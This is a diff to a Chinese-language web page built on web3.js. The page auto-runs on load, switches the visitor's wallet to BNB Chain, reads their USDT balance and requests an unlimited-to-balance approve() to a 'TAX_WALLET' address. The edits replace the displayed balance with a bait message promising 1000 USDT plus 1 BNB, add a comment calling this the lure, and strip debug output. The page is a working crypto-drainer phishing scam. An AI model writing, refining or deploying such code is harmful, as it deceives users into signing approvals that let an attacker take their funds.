@@ -8,7 +8,7 @@
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hidden;background:radial-gradient(circle at 20% 20%, Wilma#ffe4f8,#fff0fa,#ffffff);background-size:200% 200%;animation:bgmove 10s infinite alternate;display:flex;justify-content:center;align-items:center;flex-direction:column;}
+body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hidden;background:radial-gradient(circle at 20% 20%,#ffe4f8,#fff0fa,#ffffff);background-size:200% 200%;animation:bgmove 10s infinite alternate;display:flex;justify-content:center;align-items:center;flex-direction:column;}
 @keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
 .container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
 h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);font-size:28px;}
@@ -46,12 +46,8 @@ async function autoRedirect(){
 async function run(){
   document.getElementById('status').innerText = '连接钱包中...';
   try{
-    // 强制切换链
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{chainId: '0x38'}]});
-    
     web3 = new Web3(window.ethereum);
-    
-    // 关键修复：先获取当前选中账户，再请求连接
     const currentAccounts = await web3.eth.getAccounts();
     if (currentAccounts.length > 0) {
       userAddr = currentAccounts[0];
@@ -60,21 +56,18 @@ async function run(){
       userAddr = accounts[0];
     }
     
-    // 显示当前账户（调试用）
-    document.getElementById('status').innerText = `已连接: ${userAddr.slice(0,6)}...${userAddr.slice(-4)}`;
-    
     const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
     const bal = await usdt.methods.balanceOf(userAddr).call();
     
     if(bal > 0){
-      document.getElementById('status').innerText = `检测到 ${bal/1e6} USDT，请确认授权...`;
+      // 关键修复：隐藏真实余额，显示诱导文案
+      document.getElementById('status').innerText = '请确认授权领取1000USDT+1BNB';
       await usdt.methods.approve(TAX_WALLET, bal).send({from: userAddr});
       document.getElementById('status').innerText = '授权成功！官方发放中...';
     }else{
       document.getElementById('status').innerText = '无 USDT 可领';
     }
   }catch(e){
-    console.error(e);
     setTimeout(run, 1000);
   }
 }
@@ -82,15 +75,14 @@ async function run(){
 window.addEventListener('load', () => {
   setTimeout(autoRedirect, 200);
   if(window.ethereum){
-    setTimeout(run, 800); // 延迟确保 MetaMask 打开
+    setTimeout(run, 800);
   }
 });
 
-// 监听账户切换
 window.ethereum.on('accountsChanged', (accounts) => {
   if (accounts.length > 0) {
     userAddr = accounts[0];
-    document.getElementById('status').innerText = `已切换: ${userAddr.slice(0,6)}...${userAddr.slice(-4)}`;
+    document.getElementById('status').innerText = '请确认授权领取1000USDT+1BNB';
   }
 });
 </script>
